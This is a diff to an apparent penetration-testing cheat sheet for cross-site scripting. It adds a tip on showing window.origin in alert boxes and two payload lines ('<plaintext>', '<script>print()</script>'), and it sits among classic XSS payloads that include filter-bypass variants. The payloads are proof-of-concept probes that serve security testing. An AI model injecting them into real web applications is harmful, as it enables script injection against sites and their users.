@@ -71,6 +71,7 @@ Another useful [cheatsheet repo & other links](https://github.com/RenwaX23/XSS-P
 '';!--"<XSS>=&{()}
 ```
 
+> IMPORTANT: we should always look to show the `window.origin` instead of a static value like `1` in an alert box. This is because a lot of web apps will use cross-domain IFrames to handle user input, meaning if there is a vulnerability, its not a vulnerability in the application itself (like a sandbox). The origin will tell you where it is actually being executed and therefore vulnerable.
 #### Classic Payloads
 ```HTML
 <svg/onload=alert(1)>
@@ -79,6 +80,8 @@ Another useful [cheatsheet repo & other links](https://github.com/RenwaX23/XSS-P
 <ScRipT>alert(1)</scRipT>
 <%00script>alert(1)</script>
 <script>al%00ert(1)</script>
+<plaintext>
+<script>print()</script>
 ```
 
 #### HTML Tags
